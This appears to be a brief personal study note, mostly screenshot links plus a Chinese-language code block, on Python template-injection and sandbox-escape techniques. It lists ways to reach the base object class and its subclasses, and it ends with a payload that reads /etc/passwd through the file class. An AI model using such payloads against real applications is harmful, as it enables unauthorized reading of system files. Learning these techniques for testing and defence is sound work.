
![[Pasted image 20231209103240.png]]

![[Pasted image 20231209103306.png]]
![[Pasted image 20231209103325.png]]
```
获取基类的几种方法：
[].__class__.__base__

''.__class__.__mro__[2]

().__class__.__base__

{}.__class__.__base__

request.__class__.__mro__[8] 　　

[].__class__.__bases__[0]  

获取基本类的子类
[].__class__.__base__.__subclasses__()

我们可以利用的方法有<type 'file'>等（甚至file一般是第40号）

 ().__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
```
![[Pasted image 20231209103343.png]]
![[Pasted image 20231209103419.png]]
![[Pasted image 20231209103438.png]]
![[Pasted image 20231209103504.png]]
![[Pasted image 20231209103517.png]]



